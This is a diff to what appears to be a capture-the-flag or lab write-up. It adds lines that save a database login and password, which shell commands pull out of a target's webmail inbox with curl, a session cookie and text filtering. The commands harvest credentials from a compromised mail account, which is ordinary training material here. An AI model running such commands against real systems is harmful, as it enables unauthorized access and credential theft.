@@ -54,12 +54,14 @@ echo "Complete"
 ### Get database login
 ```shell
 db_login=`curl https://$IP/webmail/src/read_body.php\?mailbox\=INBOX\&passed_id\=2\&startMessage\=1 -k -b $webmail_cookie_path -s | grep "databases" | awk '{print $9}' | cut -d "/" -f 1`
+echo "$db_login" > scripts/writeup1/db_login
 echo $db_login
 ```
 
 ### Get database password
 ```shell
 db_password=`curl https://$IP/webmail/src/read_body.php\?mailbox\=INBOX\&passed_id\=2\&startMessage\=1 -k -b $webmail_cookie_path -s | grep "databases" | awk '{print $9}' | cut -d "/" -f 2`
+echo "$db_password" > scripts/writeup1/db_password
 echo $db_password
 ```
 
